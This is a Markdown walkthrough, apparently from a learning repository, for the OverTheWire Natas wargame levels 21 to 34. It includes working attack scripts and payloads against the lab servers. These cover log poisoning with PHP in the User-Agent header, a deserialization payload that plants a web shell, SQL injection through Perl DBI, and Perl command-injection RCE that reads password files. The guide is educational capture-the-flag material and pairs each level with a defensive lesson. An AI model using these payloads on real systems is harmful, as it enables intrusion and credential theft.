# 🌐 OverTheWire: Natas — Level 21 to Level 34 English Guide

> The final and most challenging section. Cross-site session sharing, PHP type juggling,  
> deserialization, LFI + log poisoning, MySQL truncation, ECB cipher cracking,  
> and Perl-specific vulnerabilities await you.

**Previous section:** [natas_11-20.md](./natas_11-20.md)  
**Reference:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-21-24/)

---

## 🗺️ Overview

| Level | Topic | Technique |
|---|---|---|
| 21 → 22 | Cross-site session sharing | Create session on experimenter site |
| 22 → 23 | PHP redirect bypass | Bypass redirect with curl |
| 23 → 24 | PHP type juggling (string > int) | `11iloveyou` |
| 24 → 25 | `strcmp()` array bypass | Return NULL with `passwd[]` array |
| 25 → 26 | LFI + Log Poisoning | `....//` bypass + User-Agent injection |
| 26 → 27 | PHP object deserialization | Serialize Logger class |
| 27 → 28 | MySQL varchar truncation | Duplicate user with `natas28` + spaces |
| 28 → 29 | ECB cipher cracking | Block cipher byte shifting |
| 29 → 30 | Perl `open()` RCE | Pipe injection with `|command` |
| 30 → 31 | Perl DBI `quote()` bypass | SQLi with array type |
| 31 → 32 | Perl Jam 2 / CGI `ARGV` | File upload + query string RCE |
| 32 → 33 | Perl Jam 2 (continued) | Run `./getpassword` binary |
| 33 → 34 | MD5 / PHP file upload + hash bypass | Phar deserialize or hash collision |

---

## Level 21 → Level 22 — Cross-Site Session Sharing

### 🎯 Task
There are two sites: the main site and `experimenter`. Create an `admin=1` session on experimenter and transfer it to the main site.

### 📖 Theory
The two sites share the same session backend. Any parameter sent to the experimenter site is written to the session — no security check!

### 🔧 Solution

```python
import requests

auth = ("natas21", "<password>")

# 1. Send admin=1 to experimenter, get PHPSESSID
r1 = requests.get(
    "http://natas21-experimenter.natas.labs.overthewire.org/",
    params={"admin": "1", "submit": "Update"},
    auth=auth
)
phpsessid = r1.cookies['PHPSESSID']

# 2. Navigate to main site with same PHPSESSID
r2 = requests.get(
    "http://natas21.natas.labs.overthewire.org/",
    auth=auth,
    cookies={"PHPSESSID": phpsessid}
)
print(r2.text)  # password is here
```

> 💡 **Lesson:** Applications sharing a session are affected by each other's security vulnerabilities. Each site should independently validate its own session.

---

## Level 22 → Level 23 — PHP Redirect Bypass (curl)

### 🎯 Task
The `?revelio` parameter shows the password but redirects immediately if you're not admin. Bypass the redirect.

### 📖 Theory
PHP `header("Location: /")` redirect is automatically followed by browsers. But `curl` doesn't follow redirects by default and shows the response body before the redirect!

### 🔧 Solution

```bash
curl -s -u natas22:<password> \
  "http://natas22.natas.labs.overthewire.org/?revelio"
# HTML returned before redirect → password inside
```

> 💡 **Lesson:** Security check shouldn't send content before the redirect. Use `exit` or `die`.

---

## Level 23 → Level 24 — PHP Type Juggling

### 🎯 Task
```php
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10))
```
Must contain "iloveyou" and be greater than 10.

### 📖 Theory: String-Integer Comparison in PHP

When a string is compared with an integer in PHP, the string's numeric value is **read from its leading digits**:
```php
"11iloveyou" > 10  → true  (11 > 10)
"iloveyou" > 10    → false (0 > 10)
```

### 🔧 Solution
```
Enter in the form: 11iloveyou
→ strstr("11iloveyou", "iloveyou") = true ✓
→ "11iloveyou" > 10 → 11 > 10 = true ✓
→ Password is given
```

> 💡 **Lesson:** PHP's weak type system (loose typing) leads to security vulnerabilities. Use `===` (strict comparison), not `==`.

---

## Level 24 → Level 25 — strcmp() Array Bypass

### 🎯 Task
```php
if(!strcmp($_REQUEST["passwd"], "<hidden_password>"))
```
Need to bypass the `strcmp()` function.

### 📖 Theory: PHP strcmp() with Array

In PHP, if `strcmp()` receives an **array** instead of a string, it returns `NULL`. `!NULL` → `true`!

```php
strcmp([], "abc")  → NULL
!NULL              → true
```

### 🔧 Solution
```
Navigate to URL:
http://natas24.natas.labs.overthewire.org/?passwd[]=anything

→ passwd[] becomes an array → strcmp returns NULL → !NULL = true → password given
```

> 💡 **Lesson:** Using `strcmp()` without type checking in PHP is dangerous. Check if the `strcmp` result `=== 0`.

---

## Level 25 → Level 26 — LFI + Log Poisoning

### 🎯 Task
The language parameter (`?lang=`) filters `../` and blocks `natas_webpass`. Combine two vulnerabilities: directory traversal bypass + log poisoning.

### 📖 Theory

**`....//` bypass:** `str_replace("../", "")` only does one pass:
```
....//  →  str_replace removes ../  →  ../  ← that's what we wanted!
```

**Log Poisoning:** The log file records User-Agent. If we write PHP code in User-Agent, the code runs when the log file is included!

### 🔧 Solution

**Step 1 — Get PHPSESSID:**
```
F12 → Application → Cookies → copy PHPSESSID value
```

**Step 2 — Write PHP code to User-Agent with Burp Suite/curl:**
```bash
curl -s -u natas25:<password> \
  "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_SESSIONID.log" \
  -H 'User-Agent: <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
```

**Step 3 — Include the log file with `....//`:**
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

PHP code runs in the log file → password appears.

> 💡 **Lesson:** Log files should never be web-accessible. User input must be sanitized before being written to logs.

---

## Level 26 → Level 27 — PHP Object Deserialization

### 🎯 Task
There's a line-drawing application. Manipulate the serialized `Logger` object in the cookie.

### 📖 Theory: PHP Object Deserialization

PHP converts data in the cookie to an object with `unserialize()`. The `Logger` class's `__destruct()` method runs when the object is destroyed. If we change `$exitMsg` and `$logFile` values, we can write the password wherever we want!

```php
class Logger {
    private $logFile;
    private $exitMsg;
    
    function __destruct() {
        // writes exitMsg to logFile
        file_put_contents($this->logFile, $this->exitMsg);
    }
}
```

### 🔧 Solution

Run in a PHP sandbox (e.g. 3v4l.org):
```php
<?php
class Logger {
    private $logFile = "/var/www/natas/natas26/img/shell.php";
    private $exitMsg = "<?php echo shell_exec(\$_GET['e']); ?>";
}

$logger = new Logger();
echo base64_encode(serialize($logger));
```

Write the resulting base64 to the `drawing` cookie → when the page loads, `__destruct()` writes shell.php:
```
http://natas26.natas.labs.overthewire.org/img/shell.php?e=cat /etc/natas_webpass/natas27
```

> 💡 **Lesson:** User data should never be processed with `unserialize()`. Use JSON.

---

## Level 27 → Level 28 — MySQL VARCHAR Truncation

### 🎯 Task
Log in as `natas28` — but you don't know the password.

### 📖 Theory: MySQL VARCHAR Overflow

MySQL `VARCHAR(64)` truncates strings longer than 64 characters. If we register with username `"natas28" + 57 spaces + "x"`:
- `validUser("natas28" + spaces + "x")` → not found → create new user
- MySQL truncates → saves as `"natas28"` (spaces are trimmed)
- Now login with `natas28` + our password → `dumpData("natas28")` → dumps real natas28's data!

### 🔧 Solution

```python
import requests

auth = ("natas27", "<password>")
url = "http://natas27.natas.labs.overthewire.org/"

# 1. Register with natas28 + 57 spaces + "x"
username = "natas28" + " " * 57 + "x"
requests.post(url, data={"username": username, "password": "mypass"}, auth=auth)

# 2. Login with "natas28" + our password
r = requests.post(url, data={"username": "natas28", "password": "mypass"}, auth=auth)
print(r.text)  # natas28's data → password inside
```

> 💡 **Lesson:** Username uniqueness must be verified at the application layer as well. Don't rely on DB truncation.

---

## Level 28 → Level 29 — ECB Cipher Cracking

### 🎯 Task
Search query is sent encrypted (ECB mode). Create an encrypted SQL injection payload.

### 📖 Theory: ECB (Electronic Codebook) Mode

ECB encryption encrypts each block independently. Same plaintext block → always same ciphertext. With this weakness we can cut and paste encrypted blocks!

```
Plaintext: [PREPEND_TEXT][OUR_INPUT][PADDING]
Encrypted: [Block1][Block2][Block3]

We can rearrange the blocks to create different plaintext!
```

### 🔧 Solution (Concept)

1. Do an empty search → get baseline encrypted value
2. Send inputs of different lengths to detect block size (increases by 32 bytes → 16-byte blocks)
3. Adjust input so the SQL injection payload aligns with a full block
4. Combine that block with the PREPEND block from baseline

For detailed Python implementation: [blog.sudarshandevkota.com.np](https://blog.sudarshandevkota.com.np/overthewire-natas-walkthrough)

> 💡 **Lesson:** ECB mode is not secure. Use CBC or GCM.

---

## Level 29 → Level 30 — Perl `open()` RCE

### 🎯 Task
Perl application opens a file with `open(FD, "$f.txt")`. Filters strings containing "natas". Run a command.

### 📖 Theory: Perl open() Security Vulnerability

In Perl, `open(FD, "|command")` runs a command! With the pipe character `|`, a command can be executed instead of a filename.

If there's a "natas" filter, use wildcards:
```
/etc/na?as_webpass/na?as30   →  bypasses natas!
```

### 🔧 Solution

```
URL:
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na%3Fas_webpass/na%3Fas30%00

%3F = ?
%00 = null byte (cut file extension)
```

Or:
```
?file=|cat /etc/*_webpass/*30
```

> 💡 **Lesson:** Don't use user input with `open()` in Perl. Use `sysopen()` or a whitelist.

---

## Level 30 → Level 31 — Perl DBI `quote()` Array Bypass

### 🎯 Task
Perl `$dbh->quote(param("password"))` tries to prevent SQL injection. Bypass it by sending an array.

### 📖 Theory: Perl CGI param() with Array

`param("password")` can return multiple values in **list context**. If you send `password` twice (`password=X&password=Y`), `param("password")` returns the list `("X", "Y")`.

`$dbh->quote(param("password"))` then flattens into a `quote("X", "Y")` call. **In DBI, the 2nd argument to `quote()` is a SQL data type (`$data_type`).** When a numeric type is supplied, `quote()` returns the value **without quotes** (the `unless ($data_type)` guard in the base implementation is skipped) → the door to SQLi opens. (Note: CGI `param()`'s 2nd argument is not a "type"; the trick is that the list's second element is handed to `quote()` as a *data type*.)

```perl
$dbh->quote(param('password'))
# param('password') → ("1 OR 1=1", 1)  → quote(value, type) → "1 OR 1=1" embedded WITHOUT quotes
# (1st element = malicious SQL value; 2nd element = numeric data type, e.g. 4=SQL_INTEGER)
```

### 🔧 Solution

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas30", "<password>")
url = "http://natas30.natas.labs.overthewire.org/"

# Send password twice: 1) malicious SQL VALUE, 2) numeric data type (disables quote)
response = requests.post(url,
    data=[
        ("username", "natas31"),
        ("password", "1 OR 1=1"),   # 1st element: value → quote embeds it without quotes
        ("password", "1")           # 2nd element: numeric type (truthy) → quoting skipped
    ],
    auth=auth
)
print(response.text)
```

> 💡 **Lesson:** In Perl CGI, `param()` returns an array in list context. DBI quote() handles this incorrectly.

---

## Level 31 → Level 32 — Perl Jam 2 / CGI ARGV

### 🎯 Task
Perl CGI file upload application. Use the "Perl Jam 2" vulnerability to gain RCE.

### 📖 Theory: Perl CGI ARGV Vulnerability

In Perl CGI, if `upload()` is called in list context, a parameter named `ARGV` has special meaning — it behaves like a command-line argument. This allows executing the URL query string as a command for `open()`!

```perl
# What it actually does:
open(FD, "filename")
# But with the ARGV trick:
open(FD, "ls . |")   → command runs!
```

### 🔧 Solution

```python
import requests

auth = ("natas31", "<password>")
url = "http://natas31.natas.labs.overthewire.org/index.pl"

# 1. First find the binary with ls
response = requests.post(
    url + "?ls . |",
    files=[('file', ('test.txt', 'test'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(response.text)  # getpassword binary visible

# 2. Run the binary
response = requests.post(
    url + "?/usr/bin/cat /etc/natas_webpass/natas32 |",
    files=[('file', ('test.txt', 'test'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(response.text)
```

---

## Level 32 → Level 33 — Perl Jam 2 (Continued) + getpassword Binary

### 🎯 Task
Same as previous level but there's no direct access to the password file — you need to run a special `getpassword` binary.

### 🔧 Solution

```python
import requests

auth = ("natas32", "<password>")
url = "http://natas32.natas.labs.overthewire.org/index.pl"

# 1. Find the getpassword binary
r = requests.post(
    url + "?ls . |",
    files=[('file', ('x', 'x'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(r.text)  # getpassword in the list

# 2. Run it
r = requests.post(
    url + "?./getpassword | xargs echo |",
    files=[('file', ('x', 'x'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(r.text)  # password here
```

---

## Level 33 → Level 34 — PHP MD5 Hash & Phar Deserialization

### 🎯 Task
There's a file upload. MD5 hash checking is performed. Bypass with Phar deserialization.

### 📖 Theory: Phar Deserialization

PHP's `phar://` stream wrapper opens Phar archives. Phar files contain serialized PHP objects in their metadata. A call like `file_get_contents("phar://file")` automatically deserializes these objects!

Even if the Phar file's MD5 is checked, `__destruct()` runs when the object in the file metadata is deserialized → access to password!

### 🔧 Solution (Concept)

1. Write a PHP script containing the `Executor` class
2. Create a `phar` archive, serialize it
3. Upload the archive (with any name — even .png works)
4. MD5 bypass: prepend a special string containing the desired hash to the file
5. When the server deserializes the phar, `__destruct()` runs

For detailed implementation: [learnhacking.io Natas 33](https://learnhacking.io/)

---

## 🏁 Congratulations — Natas Complete!

```
Level 34 → Game over!
You completed Natas — one of the most comprehensive CTF series in web security.
```

---

## 📚 Concepts Summary (Level 21-34)

| Concept | Description |
|---|---|
| **Cross-site Session** | If two sites share session backend → cross-contamination |
| **PHP Redirect Bypass** | curl doesn't automatically follow redirects |
| **Type Juggling** | In PHP `"11text" > 10` → `true` |
| **strcmp() Array** | `strcmp([], "x")` → `NULL` → `!NULL` = `true` |
| **LFI + Log Poisoning** | Log access via traversal + User-Agent injection |
| **PHP Deserialization** | Triggering `__destruct()` with `unserialize()` |
| **MySQL Truncation** | Creating duplicate user by exceeding VARCHAR limit |
| **ECB Mode Attack** | Same plaintext → same ciphertext → block manipulation |
| **Perl open() RCE** | Pipe mode with `|command` |
| **Perl DBI Array** | `param()` array → `quote()` bypass |
| **Perl Jam 2** | CGI ARGV + upload → query string RCE |
| **Phar Deserialization** | Object deserialization via `phar://` stream wrapper |

---

## 🔗 Useful Resources

- [OverTheWire Natas](https://overthewire.org/wargames/natas/)
- [LearnHacking.io Natas](https://learnhacking.io/) (levels 25-31)
- [JamesCao Natas 21-24](https://jameskaois.com/posts/overthewire-natas-level-21-24/)
- [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [Perl Jam 2 Presentation](https://www.youtube.com/watch?v=tBqHEJMalRE)
- [ECB Mode Weakness](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#ECB)
- [PHP Type Juggling Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md)
- [CyberChef](https://gchq.github.io/CyberChef/)

---

**Previous section:** [natas_11-20.md](./natas_11-20.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
